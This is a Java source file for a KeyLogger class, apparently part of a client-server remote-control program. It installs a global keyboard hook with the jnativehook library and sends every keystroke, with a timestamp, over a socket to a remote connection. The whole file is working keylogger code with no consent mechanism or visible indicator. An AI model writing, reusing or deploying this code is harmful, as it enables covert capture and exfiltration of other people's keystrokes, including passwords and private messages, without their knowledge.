package Function;

import Server.SendRecv;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.net.Socket;
import java.sql.Timestamp;

public class KeyLogger implements NativeKeyListener, SendRecv {
    public boolean isStart = false;
    private Socket connect;
    private NativeKeyListener nativeKeyListener;

    public void stopKeyLogger() {
        if (isStart) {
            GlobalScreen.removeNativeKeyListener(nativeKeyListener);
            isStart = false;
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        try {
            SendRecv.sendMess(connect, NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
            Timestamp time = new Timestamp(new java.util.Date().getTime());
//        Change time stamp to date and time format
            String timeString = time.toString();
            SendRecv.sendMess(connect, timeString);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }

    public KeyLogger(Socket connect) {
        this.connect = connect;
        nativeKeyListener = this;
    }

    public void startKeyLog() {
        if (isStart) {
            return;
        }

        if (!GlobalScreen.isNativeHookRegistered()) {
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException ex) {
                System.err.println("There was a problem registering the native hook.");
                System.err.println(ex.getMessage());
            }
        }

        GlobalScreen.addNativeKeyListener(nativeKeyListener);
        isStart = true;
    }
}